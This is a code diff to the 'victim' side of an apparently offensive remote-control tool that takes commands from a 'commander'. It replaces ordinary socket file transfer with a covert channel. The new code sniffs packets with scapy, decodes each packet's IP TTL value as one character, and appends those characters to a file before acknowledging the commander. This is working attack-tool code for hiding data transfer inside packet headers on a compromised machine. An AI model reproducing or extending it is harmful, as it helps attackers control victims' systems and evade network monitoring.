@@ -1,5 +1,10 @@
+import base64
 import threading
 import time
+
+from scapy.layers.inet import IP
+from scapy.sendrecv import sniff
+
 from victim_utils import *
 
 if __name__ == '__main__':
@@ -226,20 +231,31 @@ if __name__ == '__main__':
                     filename = client_socket.recv(1024).decode()
                     print(constants.RECEIVING_FILE_MSG.format(filename))
 
-                    with open(filename, constants.WRITE_BINARY_MODE) as file:
-                        eof_marker = constants.FILE_END_OF_FILE_SIGNAL  # Define the end-of-file marker
+                    # Function to extract data from received packets
+                    def extract_data(packet):
+                        if packet.haslayer("IP"):
+                            ttl = packet.getlayer("IP").ttl
+                            print(ttl)
+                            return ttl  # Retrieve the TTL value
 
-                        while True:
-                            file_data = client_socket.recv(1024)
-                            if not file_data:
-                                break  # No more data received
-                            if file_data.endswith(eof_marker):
-                                file.write(file_data[:-len(eof_marker)])  # Exclude the end-of-file marker
-                                break
-                            else:
-                                file.write(file_data)
+                    # Function to process the extracted data
+                    def process_data(d, f_name):
+                        if d is not None:
+                            # Convert TTL values to string and write to the file
+                            decoded_data = chr(d)
+                            with open(f_name, 'a') as f:  # Open in append mode
+                                f.write(decoded_data)
+                                print("[+] Data written to {}".format(f_name))
 
-                    # Send ACK to commander (if good)
+                    # Sniff incoming packets and extract data
+                    def receive_packets():
+                        print("[+] Sniffing packets...")
+                        sniff(prn=lambda x: process_data(extract_data(x), filename), store=0, count=10)
+
+                    # Start receiving packets
+                    receive_packets()
+
+                    # # Send ACK to commander (if good)
                     if is_file_openable(filename):
                         print(constants.TRANSFER_SUCCESS_MSG.format(filename))
                         client_socket.send(constants.VICTIM_ACK.encode())
